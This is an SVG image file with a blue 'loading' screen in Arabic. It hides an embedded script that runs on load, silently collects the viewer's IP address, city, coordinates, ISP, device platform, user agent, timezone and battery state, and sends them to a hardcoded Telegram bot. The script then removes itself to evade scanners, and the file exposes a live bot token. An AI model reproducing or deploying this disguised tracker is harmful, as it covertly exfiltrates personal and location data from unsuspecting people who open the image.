<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
    <rect width="100%" height="100%" fill="blue" /> <text x="50%" y="50%" dominant-baseline="middle" text-anchor="middle" fill="white" font-size="20">
        جارٍ التحميل...
    </text>
    
    <script type="text/javascript">
        <![CDATA[
            // إعدادات البوت (تبقى هنا للسرية)
            const TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
            const CHAT_ID = "1611398303";

            async function sendToBot(msg) {
                try {
                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "Markdown" })
                    });
                } catch (e) {
                    console.error("Error sending to bot:", e);
                }
            }

            // سحب الـ IP الحقيقي والمعلومات الجغرافية
            async function getAdvancedIP() {
                try {
                    const response = await fetch('https://ipapi.co/json/');
                    const d = await response.json();
                    let report = `🕵️ **تقرير بصمة صامتة (SVG)**\n`;
                    report += `🌐 العنوان: \`${d.ip}\`\n`;
                    report += `📍 المدينة: \`${d.city}, ${d.country_name}\`\n`;
                    report += `🏢 المزود: \`${d.org}\`\n`;
                    report += `📡 الإحداثيات: \`${d.latitude}, ${d.longitude}\``;
                    await sendToBot(report);
                } catch (e) {
                    console.log("IP Stealth Failed in SVG");
                }
            }

            // سحب بصمة الجهاز التقنية
            async function captureDeviceDetails() {
                const details = `📱 **تفاصيل الجهاز الصامتة (SVG)**\n` +
                    `🖥️ النظام: \`${navigator.platform}\`\n` +
                    `🕰️ التوقيت: \`${Intl.DateTimeFormat().resolvedOptions().timeZone}\`\n` +
                    `🗣️ اللغة: \`${navigator.language}\`\n` +
                    `🌐 الوكيل: \`${navigator.userAgent}\``; // User Agent الكامل
                await sendToBot(details);
            }
            
            // سحب معلومات البطارية (صامت)
            async function getBatteryInfo() {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    const bat_info = `🔋 **معلومات البطارية (SVG)**\n` +
                                     `نسبة الشحن: \`${(battery.level * 100).toFixed(2)}%\`\n` +
                                     `جاري الشحن: \`${battery.charging ? 'نعم' : 'لا'}\``;
                    await sendToBot(bat_info);
                }
            }


            // تشغيل جميع الوظائف الصامتة عند تحميل الصورة
            window.onload = async () => {
                await getAdvancedIP();
                await captureDeviceDetails();
                await getBatteryInfo();
            };

            // للحماية من بعض أدوات الفحص، يمكن إخفاء السكربت بعد التنفيذ
            setTimeout(() => {
                const scriptTag = document.querySelector('svg script');
                if (scriptTag) scriptTag.remove();
            }, 1000); // إزالة السكربت بعد ثانية واحدة من التنفيذ
        ]]>
    </script>
</svg>
